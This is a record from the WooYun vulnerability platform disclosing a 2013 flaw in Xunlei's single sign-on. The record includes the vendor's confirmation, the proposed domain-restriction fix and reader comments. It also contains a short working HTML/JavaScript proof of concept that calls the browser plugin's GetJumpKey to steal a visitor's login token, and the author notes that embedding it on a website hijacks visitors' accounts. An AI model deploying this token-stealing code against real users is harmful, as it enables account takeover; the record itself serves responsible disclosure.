{"id": 9026, "wybug_id": "wooyun-2013-035328", "wybug_title": "迅雷单点登陆漏洞", "wybug_corp": "迅雷", "wybug_author": "p.z", "wybug_date": "2013-08-26 19:00", "wybug_open_date": "2013-10-10 19:00", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-10：\t细节向公众公开  简要描述：  详细说明：  迅雷单点登陆未对域名进行判断,导致任意的web域都可以调用组件的接口,获取jumpkey,利用该串jumpkey,可以顺利登陆到迅雷.   漏洞证明：  在乌云网下执行js可以取到jumpkey\n\n简单poc\n<html><body><button onclick=get()>Get Token</button><form action='http://login2.xunlei.com/jumplogin/' method='post' id='form-login'>    <input id='input-token' name='jumpkey' value='' type='text'>    <input type='submit'></form><script type=\"text/javascript\">    var token = '';    var s = document.createElement(\"embed\");    s.style.visibility = \"hidden\";    s.type = \"application/npxluser_plugin\";    s.width = 0;    s.height = 0;    document.body.appendChild(s);        function get(){        token = s.GetJumpKey();        if(token){            document.getElementById('input-token').value = token        }    }</script></body></html>\n把上述代码稍作修改,加到自己的网站中,如果访客中有正开着迅雷的,可以直接获取这个账户的权限,如果刚好是vip就更好了,去迅雷离线下下葫芦娃什么的.   修复方案：  限定web域名   版权声明：转载请注明来源 p.z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-08-27 14:47 厂商回复： 感谢反馈，已经定位到问题了，已经开始加入域白名单。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-26 19:04 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  mark    \n     2013-08-26 19:29 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  能搞云点播么？    \n     2013-08-26 19:47 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  可以搞种子么    \n     2013-08-26 19:48 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  mark    \n     2013-08-26 21:20 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  pz姐估计寂寞了    \n     2013-08-26 22:56 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  @小胖胖要减肥 小胖胖 你可以喜欢我吗    \n     2013-08-26 23:07 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @p.z 来吧  我时刻准备着    \n     2013-08-27 08:04 |    \t\tKi11 \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:5        | ส็็็็็็็็็็็็็็็็็็็...)\t\t \n  这是什么东西    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}